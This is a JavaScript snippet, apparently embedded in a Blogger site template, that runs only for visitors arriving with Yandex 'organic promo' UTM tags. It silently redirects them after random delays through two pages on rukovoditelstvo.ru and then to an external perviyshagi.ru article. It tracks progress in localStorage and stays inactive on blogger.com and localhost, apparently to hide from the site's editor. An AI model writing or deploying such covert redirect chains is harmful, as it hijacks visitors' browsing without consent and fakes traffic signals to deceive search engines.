//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
        "https://www.rukovoditelstvo.ru/2023/05/unlocking-power-of-diversity-strategies.html",
		"https://www.rukovoditelstvo.ru/2023/05/the-art-of-effective-leadership.html",
		"https://www.rukovoditelstvo.ru/2023/05/navigating-digital-era-harnessing.html",
		"https://www.rukovoditelstvo.ru/2023/05/creating-culture-of-innovation.html",
		"https://www.rukovoditelstvo.ru/2023/05/sustainable-business-practices-building.html",
		"https://www.rukovoditelstvo.ru/2023/05/building-strong-customer-relationships.html",
		"https://www.rukovoditelstvo.ru/2023/05/the-future-of-work-adapting-to-changing.html",
		"https://www.rukovoditelstvo.ru/2023/05/mastering-art-of-negotiation-strategies.html",
		"https://www.rukovoditelstvo.ru/2023/05/strategic-marketing-in-digital-age.html",
        "https://www.rukovoditelstvo.ru/2023/05/the-importance-of-emotional.html"
    ];

    const externalLinks = [
    "https://perviyshagi.ru/2023/05/10-steps-to-successfully-launching-your.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://perviyshagi.ru/2023/05/the-ultimate-guide-to-finding-your.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://perviyshagi.ru/2023/05/the-importance-of-market-research-for.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://perviyshagi.ru/2023/05/funding-your-startup-comprehensive.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://perviyshagi.ru/2023/05/building-strong-business-plan-key.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://perviyshagi.ru/2023/05/effective-marketing-strategies-for.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://perviyshagi.ru/2023/05/navigating-legal-and-regulatory.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://perviyshagi.ru/2023/05/hiring-right-team-recruiting-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://perviyshagi.ru/2023/05/scaling-up-your-business-strategies-for.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://perviyshagi.ru/2023/05/embracing-digital-transformation.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

